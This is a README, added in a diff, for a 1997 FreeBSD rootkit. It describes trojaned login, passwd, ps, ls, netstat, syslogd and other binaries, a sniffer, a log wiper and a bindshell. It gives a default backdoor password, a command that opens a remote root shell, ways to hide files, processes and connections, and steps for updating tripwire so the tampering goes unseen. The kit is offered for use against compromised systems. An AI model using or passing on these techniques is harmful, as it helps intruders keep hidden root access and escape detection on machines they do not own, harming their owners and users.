@@ -1,0 +1,159 @@
+The
+ _____              ____ ____  ____  
+|  ___| __ ___  ___| __ ) ___||  _ \ 
+| |_ | '__/ _ \/ _ \  _ \___ \| | | |
+|  _|| | |  __/  __/ |_) |__) | |_| |
+|_|  |_|  \___|\___|____/____/|____/  rootkit 1.0 (1/7/97) by Method
+                                     
+NOTE: This package was heavily influenced by the existing Linux rootkit, 
+which in turn was adapted from the SunOS rootkit, etc., etc.
+
+UPDATES: None! This is the first release, silly.
+
+This package includes the following:
+
+chpass		Trojaned! User->r00t
+inetd		Trojaned! Remote access
+login		Trojaned! Remote access
+ls		Trojaned! Hide files
+du		Trojaned! Hide files
+ifconfig	Trojaned! Hide sniffing
+netstat		Trojaned! Hide connections
+passwd		Trojaned! User->r00t
+ps		Trojaned! Hide processes
+rshd		Trojaned! Remote access
+syslogd		Trojaned! Hide logs
+sniffit		A kewl sniffz0r!
+fix		File fixer!
+addlen		File length fixer(!)
+zapbsd2		An improved utmp/wtmp/lastlog type zapper
+bindshell	port/shell type daemon!
+		
+INSTALLATION:
+To install this kit execute the command 'make all install' from the # prompt.
+All of the file/password configurations are in config.h so feel free to
+modify things to suit your particular fancy.  Everything here has been 
+tested on a FreeBSD-stable distribution. See the note at the end about 
+what to do if the admin uses tripwire. Also make sure to read the 
+Makefile and scripts so you know what's going on.
+
+USAGE:
+OK I will go through how to use each program one by one. NOTE when I say 
+password I mean the rootkit password not your users password (d0h!). By 
+default the rootkit password is "h0tb0x".
+
+chpass -	Local user->root. Run ch{sh,fn,pass} then when it asks you 
+		for a new name enter your password.
+
+inetd -	 	Binds a shell to a port for remote access. Adds a shell 
+		exec service on the ingreslock port.
+
+login -		Allows login to any account with the rootkit password.
+		If root login is refused on your terminal login as "r00t".
+		History logging is disabled if you login using your password.
+
+ls -		Trojaned to hide specified files and directories.
+		The default data file is /dev/ptyr.
+		All files can be listed with 'ls -/'.
+		The format of /dev/ptyr is:
+		ptyr
+		fbsdrootkit-1.0
+		pr0n
+		Use partial filenames. This would hide any files/directories 
+		with the names ptyr, fbsdrootkit-1.0 and pr0n.
+
+du -		(see ls)
+
+ifconfig -	Modified to remove PROMISC flag on the ethernet device.
+
+netstat -	Modified to remove tcp/udp/sockets from or to specified
+		addresses, paths and ports.
+		default data file: /dev/ptyq
+		command 1: hide local address
+		command 2: hide remote address
+		command 3: hide local port
+		command 4: hide remote port
+		command 5: hide UNIX socket path
+
+		example:
+		1 128.31        <- Hides all local connections from 128.31.X.X
+		2 128.31.39.20  <- Hides all remote connections to 128.31.39.20
+		3 8000          <- Hides all local connections from port 8000
+		4 6667          <- Hides all remote connections to port 6667
+		5 .term/socket  <- Hides all UNIX sockets including the path 
+				   .term/socket
+		
+passwd -	Local user->root. Enter your rootkit password instead of your
+		old password.
+
+ps -		Modified to remove specified processes.
+		Default data file is /dev/ptyp.
+		An example data file is as follows:
+        	0 0             Strips all processes running under root
+        	1 p0            Strips tty p0
+        	2 sniffer       Strips all programs with the name sniffer
+		Don't put in the comments, obviously.
+
+rshd -		Execute remote commands as root. 
+		Usage: rsh -l rootkitpassword host command
+		i.e. rsh -l h0tb0x 0wn3d.escape.com /bin/sh -i
+		would start a root shell.
+
+syslogd -	Modified to remove specified strings from logging.
+		I thought of this one when I was on a system which logged
+		every connection.. I kept getting pissed off with editing
+		files every time I connected to remove my hostname. Then I 
+		thought 'Hey dude, why not trojan syslogd?!' and the rest
+		is history. :)
+		Default data file is /dev/ptys
+		Example data file:
+		evil.com
+		123.100.101.202
+		rshd
+		This would remove all logs containing the strings evil.com,
+		123.100.101.202 and rshd. Smart! :))
+
+sniffit -	An advanced network sniffer. This is pretty kewl and has lots
+		of filtering options and other stuff. Useful for targetting a
+		single host or net. Sniffit uses ncurses.
+
+bindshell -	This is pretty self-explanatory. Basically it binds a 
+		shell to a port, 31337 by default. Read the source on 
+		this one.
+
+fix -		Replaces and fixes timestamp/checksum infomation on files.
+		I modified this a bit for my own uses and to fix a nasty bug
+		when replacing syslogd and inetd. The replacement file will
+		be erased by fix (unlike other versions).  
+
+addlen -	This quickie modifies the length of files by adding 
+		harmless zeros to the end. Wonder why nobody ever 
+		thought of doing this before. Inspired by a stupid 
+		security tool which checks lengths of setuid files.
+
+zapbsd2 -	This improved version of zapbsd writes over entries with 
+		ones instead of zeros.  I added some capabilities and 
+		error checking so I raised the number.
+
+TRIPWIRE:
+This part is by no means complete. I have provided a script and a simple 
+interface through the Makefile to update the tripwire database for each 
+modified binary and directory. Simply run 'make tripwire' and all the 
+work is done for you.
+
+SOURCES:
+Some of these patches are derived from the original SunOS rootkit. ls, 
+du, ps, netstat and chpass were done by yours truly. Anything else came 
+from the Linux rootkit with a few modifications. The idea for tripwire 
+was my own.
+
+OTHER:
+I welcome all comments and questions at method@yikes.com. All complaints 
+and flames will be sent to /dev/null.
+
+Thanks to OGhost and Phelix for beta testing and advice.
+
+In closing, this kit can only take you so far. Although it covers almost 
+everything, a competent sysadmin will eventually catch on. Remember, 
+never let your guard down.
+-M
